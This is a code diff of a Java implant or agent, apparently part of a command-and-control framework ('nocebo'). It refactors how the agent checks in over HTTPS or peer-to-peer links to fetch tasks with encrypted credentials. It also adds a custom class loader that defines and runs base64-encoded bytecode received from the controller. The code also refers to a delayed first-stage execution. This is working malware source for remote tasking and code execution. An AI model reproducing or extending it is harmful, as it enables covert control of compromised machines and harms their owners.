@@ -37,6 +37,7 @@ import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
 
 import java.net.UnknownHostException;
+import java.nio.charset.MalformedInputException;
 import java.nio.charset.StandardCharsets;
 import java.rmi.Naming;
 import java.rmi.Remote;
@@ -60,12 +61,16 @@ import javax.crypto.IllegalBlockSizeException;
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLHandshakeException;
 import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
+import javax.swing.text.html.HTMLEditorKit.Parser;
 
+import java.net.ConnectException;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
+import java.net.MalformedURLException;
 import java.net.NetworkInterface;
 import java.net.Socket;
 import java.net.SocketException;
@@ -82,9 +87,7 @@ import java.awt.HeadlessException;
 import java.awt.Toolkit;
 
 
-
-
-class iAgent
+public class iAgent
 {
 
     public static class nConfig
@@ -116,8 +119,9 @@ class iAgent
     static public network nComm = new network();
     static public P2PInterface ifaceP2P = null;
     static private security secInst = new security();
+    static private pkgLib packager = new pkgLib();
 
-    public static void init() throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void init() throws ParserConfigurationException, RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         System.out.println("valhalla");
         //add execution delay of 10 minutes +/- to 1st stage
@@ -159,7 +163,6 @@ class iAgent
     {
         //consolidate task and keepalive
         //5 tries to checkin
-        utilitarian nUtil = new utilitarian();
 
         int c;
         for (c=0; c<4; c++)
@@ -168,74 +171,33 @@ class iAgent
             {  
                 if (config.isDownstream == 1)
                 {
-                    //we have a problem. Theoretically this network configuration will eventually eat itself
-            
-                    //every agent wants to talk to other agents, and will attempt to do so if possible
-
-                    //add logic on tasking to allow for multiple upstreams
-                    if (config.upstreamHost.equals("null"))
-                    {
-                        config.upstreamHost = (String) p2pList.get(c);
-                    }
-
-                    ArrayList ifaceP2PRaw = nComm.initP2PInterface();
-
-                    if (!((String) ifaceP2PRaw.get(0)).equals("null"))
-                    {
-                        continue;
-                    }
-
-                    ifaceP2P = (P2PInterface) ifaceP2PRaw.get(1);
-                    String ephemeralNonce = nUtil.strand(12);
-
-                    String passwdEncoded = new String(
-                        Base64.getEncoder().encode(
-                            secInst.encrypt(
-                                config.passMat.getBytes(StandardCharsets.UTF_8),
-                                config.defaultKey.getBytes(StandardCharsets.UTF_8), 
-                                ephemeralNonce.getBytes(StandardCharsets.UTF_8)
-                            )
-                        )
-                    );
-
-                    
-                    ArrayList<String> downstreamList = new ArrayList(downstreamAgents.keySet());
-
-
-                    Hashtable authData = ifaceP2P.auth(sessUUID,passwdEncoded,downstreamList,ephemeralNonce);
-                    cookieData = authData.get("cookie").toString();
-                    ArrayList newTaskSet = (ArrayList) authData.get("tasks");
-                    for (int t=0;t<newTaskSet.size();t++)
-                    {
-                        System.out.println(newTaskSet.get(t).toString());
-                        tasks.add((Hashtable) newTaskSet.get(t));
-                    }
-
-                    break;
-                }
-                else
-                {
-                    String cReq = nComm.request(nComm.mkAuth(),"auth");
-                    if (cReq != "null")
-                    {
-                        Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
-    
-                        nonce = xmlResponse.get("nonce").toString();
-                        cookieData = xmlResponse.get("cookie").toString();
-                        config.encKey = xmlResponse.get("key").toString();
-    
-                        ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
-    
-                        for (int k=0; k<taskSet.size(); k++)
-                        {
-                            tasks.add(taskSet.get(k));
-                        }
-                        break;
-                    }
-                    else
+                    boolean P2PValid = tryP2PConnection(c);
+                    if (!P2PValid && c<4)
                     {
                         TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                         continue;
+                    }
+                    else if (!P2PValid && c == 4) 
+                    {
+                        //try once
+                        tryHttpsConnection();
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+                else
+                {
+                    boolean httpsValid = tryHttpsConnection();
+                    if (!httpsValid)
+                    { 
+                        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
+                        continue;
+                    }
+                    else
+                    {
+                        break;
                     }
                 }
             }
@@ -258,6 +220,108 @@ class iAgent
         }
     }
 
+    public static boolean tryP2PConnection(int c) throws Exception, NoSuchAlgorithmException, ParserConfigurationException, InterruptedException
+    {
+        //for safety, knocking it down to zero to ensure it never reaches an out of bounds exception
+        if (c > p2pList.size())
+        {
+            c = 0;
+        }
+
+        if (config.upstreamHost.equals("null"))
+        {
+            try
+            {
+                config.upstreamHost = (String) p2pList.get(c);
+            }
+            catch (Exception e)
+            {
+                return false;
+            }
+        }
+
+        ArrayList ifaceP2PRaw = nComm.initP2PInterface();
+
+        if (!((String) ifaceP2PRaw.get(0)).contains("null"))
+        {
+            return false;
+        }
+
+        ifaceP2P = (P2PInterface) ifaceP2PRaw.get(1);
+        String ephemeralNonce = nUtil.strand(12);
+
+        String passwdEncoded = new String(
+            Base64.getEncoder().encode(
+                secInst.encrypt(
+                    config.passMat.getBytes(StandardCharsets.UTF_8),
+                    config.defaultKey.getBytes(StandardCharsets.UTF_8), 
+                    ephemeralNonce.getBytes(StandardCharsets.UTF_8)
+                )
+            )
+        );
+
+        
+        ArrayList<String> downstreamList = new ArrayList(downstreamAgents.keySet());
+
+        Hashtable authData = new Hashtable();
+        try
+        {
+            authData = ifaceP2P.auth(sessUUID,passwdEncoded,downstreamList,ephemeralNonce);
+        }
+        catch (Exception e)
+        {
+            return false;
+        }
+
+        if (authData.containsKey("error"))
+        {
+            return false;
+        }
+
+        cookieData = authData.get("cookie").toString();
+        ArrayList newTaskSet = (ArrayList) authData.get("tasks");
+        for (int t=0;t<newTaskSet.size();t++)
+        {
+            tasks.add((Hashtable) newTaskSet.get(t));
+        }
+        return true;
+    }
+
+    public static boolean tryHttpsConnection() throws Exception, IOException, ParserConfigurationException, InterruptedException
+    {
+        String cReq = new String();
+        try
+        {
+            cReq = nComm.request(nComm.mkAuth(),"auth");
+        }
+        catch (Exception e)
+        {
+            return false;
+        }
+
+        if (cReq != "null")
+        {
+            Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
+
+            nonce = xmlResponse.get("nonce").toString();
+            cookieData = xmlResponse.get("cookie").toString();
+            config.encKey = xmlResponse.get("key").toString();
+
+            ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
+
+            for (int k=0; k<taskSet.size(); k++)
+            {
+                tasks.add(taskSet.get(k));
+            }
+            return true;
+        }
+        else
+        {
+            
+            return false;
+        }
+    }
+
     public static void react() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //exec method, uses threader, loops to keepalive
@@ -274,9 +338,6 @@ class iAgent
 
             if (!taskObj.get("uuid").toString().equals(sessUUID))
             {
-                System.out.println(taskObj.toString());
-                System.out.println("nope, not my problem");
-                System.out.println(sessUUID);
                 continue;
             }
 
@@ -307,30 +368,16 @@ class iAgent
                 {
                     String[] classicalElements = classSet[b].split("\\.");
                     String classNameActual = new String(Base64.getDecoder().decode(classicalElements[0]));
+                    
                     byte[] rawMeth = Base64.getDecoder().decode(classicalElements[1]);
-
-                    Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
-                                        String.class, byte[].class, int.class, int.class);
-                    defineNewClass.setAccessible(true);
                     if (classNameActual.equals(className))
                     {
-                        classObj = (Class) defineNewClass.invoke(
-                            ClassLoader.getSystemClassLoader(),
-                            String.format("com.nocebo.nCore.%s",className),
-                            rawMeth,
-                            0,
-                            rawMeth.length
-                        );
+                        System.out.println(classNameActual);
+                        classObj = packager.load(classNameActual, rawMeth);
                     }
                     else
                     {
-                        defineNewClass.invoke(
-                            ClassLoader.getSystemClassLoader(),
-                            String.format("com.nocebo.nCore.%s",className),
-                            rawMeth,
-                            0,
-                            rawMeth.length
-                        );
+                        packager.load(classNameActual, rawMeth);
                     }
                 }
             }
@@ -371,6 +418,13 @@ class iAgent
 
         Thread threadedTask = new Thread(rObj);
         threadedTask.start();
+    }
+
+    private static class pkgLib extends ClassLoader {
+        private Class load(String className, byte[] classical)
+        {
+            return defineClass(String.format("com.nocebo.nCore.%s",className), classical, 0, classical.length);
+        }
     }
 
     public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -485,12 +539,14 @@ class iAgent
             Hashtable methObj = new Hashtable();
             try
             {
+                System.out.println(cData.getName());
                 Method cMethodical = cData.getMethod(methodName,String[].class);
                 methObj.put("methodical",cMethodical);
                 methObj.put("error","null");
             }
             catch (Exception e)
             {
+                System.out.println("oops");
                 methObj.put("methodical","null");
                 methObj.put("error",e.getMessage());
             }
